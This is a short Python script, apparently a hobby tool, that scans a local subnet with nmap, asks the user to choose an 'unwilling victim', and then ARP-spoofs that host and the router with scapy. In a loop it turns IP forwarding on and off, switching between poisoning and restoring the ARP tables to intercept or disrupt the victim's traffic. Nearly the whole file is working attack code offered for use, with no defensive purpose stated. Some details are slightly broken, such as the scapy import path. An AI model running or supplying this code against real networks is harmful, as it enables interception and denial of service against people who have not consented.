import nmap, os, sys, time
from scapy import *

def getHosts():
    global victim_list, victim_dict
    victim_dict = {}
    victim_list = []
    print("Scanning for hosts...")

    nm = nmap.PortScanner()
    nm.scan(hosts='192.168.1.1/24', arguments='-sP -P0')

    for host in nm.all_hosts():
        victim_dict[nm[host].hostname()] = host # create k v pairs in format (hostname : ip)

    del victim_dict[""]

    for i, v in enumerate(victim_dict):
        victim_list.append(v)
        print(str(i) + " - " + v.strip(".lan"))  # print list of hosts with index number

    print("")


def getInterface():
    print("List of current interfaces:")
    interfaces = os.listdir(path='/sys/class/net/')
    counter = 1
    for interface in interfaces:
        print(str(counter) + " - " + interface)
        counter += 1

    slct_interface = interfaces[int(input("Please select an interface\n"))]
    # the above selects from the formatted list
    return slct_interface


def getVictim():
    num = int(input("Please select your unwilling victim\n"))
    # above will get number of victim in list
    victim = victim_list[num]  # set victim
    return victim_dict[victim]


def hijackMac(IP):
    ans, unans = arping(IP)
    for s, r in ans:
        return r[Ether].src


def getRouter():
    return victim_dict[victim_list[0]]


def spoof(router, victim):
    victimMac = hijackMac(victim)
    routerMac = hijackMac(router)

    send(ARP(op = 2, pdst = victim, psrc = router, hwdst = victimMac))
    send(ARP(op = 2, pdst = router, psrc = victim, hwdst = routerMac))


def restore(router, victim):
    victimMac = hijackMac(victim)
    routerMac = hijackMac(router)
    send(ARP(op = 2, pdst = router, psrc = victim, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMac), count = 4) 
    send(ARP(op = 2, pdst = victim, psrc = router, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMac), count = 4)


def juggle(router, victim):
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    while 1:
        try:
            spoof(router, victim)
            print("\n(╯°□°）╯︵ ┻━┻\n")
            time.sleep(5)
            restore(router, victim)
            print("\n┬──┬◡ﾉ(° -°ﾉ)\n")
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            time.sleep(5)

        except KeyboardInterrupt:
            restore(router, victim)
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            sys.exit(1)


if __name__ == "__main__":
    getHosts()
    victim = getVictim()
    router = getRouter()
    interface = getInterface()
    juggle(router, victim)
